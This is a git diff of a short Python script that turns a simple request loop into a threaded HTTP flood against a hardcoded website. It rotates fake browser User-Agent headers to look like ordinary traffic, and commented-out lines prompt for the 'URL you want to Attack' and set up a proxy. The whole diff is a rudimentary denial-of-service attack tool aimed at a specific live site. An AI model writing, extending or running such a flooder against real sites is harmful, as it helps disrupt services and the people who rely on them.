@@ -3,11 +3,50 @@ from fake_useragent import UserAgent
 import random
 import threading
 
-def send_req(url):
-    res = requests.get(url)
 
-for i in range(10):
-    send_req("https://centinels.zeal.ninja/")
+def random_user_agent():
+    user_agent = UserAgent()
+    headers ={
+        'User-Agent': user_agent.random,
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Connection': 'keep-alive',
+        'Upgrade-Insecure-Requests': '1'
+    }
+    return headers
+
+# url=input("Enter the URL you want to Attack:")
+# Thread =int(input("Enter the No: of Threads:"))
+url = "https://centinels.zeal.ninja/"
+Thread = 10
+
+def send_req(url):
+#     proxy = {
+#     'http': 'http://115.96.208.124:8080',
+#     'https': 'https://1115.96.208.124:8080'
+# }
+     
+    try:
+     res = requests.get(url, headers=random_user_agent())
+    except Exception as e:
+        print(f"Error making request to {url}: {e}")  
+
+
+threads =[]
+
+i=0
+while i <= Thread:
+    thread = threading.Thread(target=send_req, args=(url,))
+    thread.start()
+    threads.append(thread)
+    i += 1
+
+for thread in threads:
+    thread.join()    
+
+
+
 
 
 
